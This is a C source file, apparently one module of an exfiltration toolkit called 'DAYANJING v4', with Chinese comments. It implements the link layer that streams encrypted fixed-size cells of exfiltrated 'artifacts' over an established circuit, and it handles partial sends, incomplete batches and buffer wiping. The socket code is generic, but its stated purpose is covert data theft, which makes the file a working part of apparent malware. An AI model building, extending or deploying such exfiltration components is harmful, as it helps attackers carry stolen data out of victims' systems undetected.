/*
 * DAYANJING v4 — exfil_link.c
 *
 * 回传层与已建立电路的 IO 绑定。设计依据见 exfil_link.h。
 *
 * 本层不含任何密码学：AEAD 在 14_p2p 的信元层，密钥材料在 chan 层。
 * 本层只负责「字节流 <-> 定长信元」的搬运与边界判定。
 */

#include "exfil_link.h"

#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>

#define EXF_LINK_NOSIGNAL MSG_NOSIGNAL

int exfil_link_write_all(int fd, const uint8_t *buf, size_t n)
{
    if (fd < 0 || (!buf && n > 0)) return -1;
    size_t off = 0;
    while (off < n) {
        ssize_t w = send(fd, buf + off, n - off, EXF_LINK_NOSIGNAL);
        if (w < 0) {
            if (errno == EINTR) continue;
            return -1;
        }
        if (w == 0) return -1;          /* 不应发生；防死循环 */
        off += (size_t)w;
    }
    return 0;
}

size_t exfil_link_read_exact(int fd, uint8_t *buf, size_t n)
{
    if (fd < 0 || !buf) return 0;
    size_t off = 0;
    while (off < n) {
        ssize_t r = recv(fd, buf + off, n - off, 0);
        if (r < 0) {
            if (errno == EINTR) continue;
            break;
        }
        if (r == 0) break;              /* 对端关闭 */
        off += (size_t)r;
    }
    return off;
}

int exfil_link_send(exfil_chan_t *ch, const exfil_rec_t *r, int fd,
                    size_t *out_cells)
{
    if (!ch || !r || fd < 0) return EXF_ERR_ARG;

    size_t n = 0;
    int rc = exfil_send_cells(r, &n);
    if (rc != EXF_OK) return rc;
    if (n == 0 || n > EXF_LINK_MAX_CELLS) return EXF_ERR_LEN;

    size_t bytes;
    if (n > (size_t)-1 / P2P_CELL_WIRE) return EXF_ERR_LEN;
    bytes = n * P2P_CELL_WIRE;

    uint8_t *wire = (uint8_t *)malloc(bytes);
    if (!wire) return EXF_ERR_LEN;

    size_t got = 0;
    rc = exfil_chan_send(ch, r, wire, bytes, &got);
    if (rc != EXF_OK || got != n) {
        /* 信元数与预估不符：编码侧与预估侧不一致，属于内部错误，
           绝不能只写一部分就当成功（那会送出半条产物）。 */
        memset(wire, 0, bytes);
        free(wire);
        return (rc != EXF_OK) ? rc : EXF_ERR_LEN;
    }

    int io = exfil_link_write_all(fd, wire, bytes);
    memset(wire, 0, bytes);
    free(wire);
    if (io != 0) return EXF_ERR_IO;

    if (out_cells) *out_cells = n;
    return EXF_OK;
}

int exfil_link_recv(exfil_chan_t *ch, int fd, exfil_rec_t *r,
                    uint8_t *payload, size_t cap, size_t *plen)
{
    if (!ch || !r || fd < 0) return EXF_ERR_ARG;

    uint8_t cell[P2P_CELL_WIRE];

    for (;;) {
        size_t got = exfil_link_read_exact(fd, cell, P2P_CELL_WIRE);
        if (got == 0) {
            /* 对端关闭：批若未完成，必须按失败处理，绝不静默成功 */
            if (exfil_chan_incomplete(ch)) return EXF_ERR_INCOMPLETE;
            return EXF_ERR_IO;
        }
        if (got != P2P_CELL_WIRE) {
            /* 收到残缺信元：对端崩溃或链路被掐断 */
            if (exfil_chan_incomplete(ch)) return EXF_ERR_INCOMPLETE;
            return EXF_ERR_IO;
        }

        int rc = exfil_chan_feed(ch, cell, r, payload, cap, plen);
        if (rc == EXF_DONE || rc == EXF_PARTIAL || rc == EXF_OK) {
            if (rc == EXF_DONE) return EXF_DONE;
            continue;                    /* 累积中或覆盖信元，继续读 */
        }
        return rc;                       /* AUTH / CRC / FMT / LEN */
    }
}
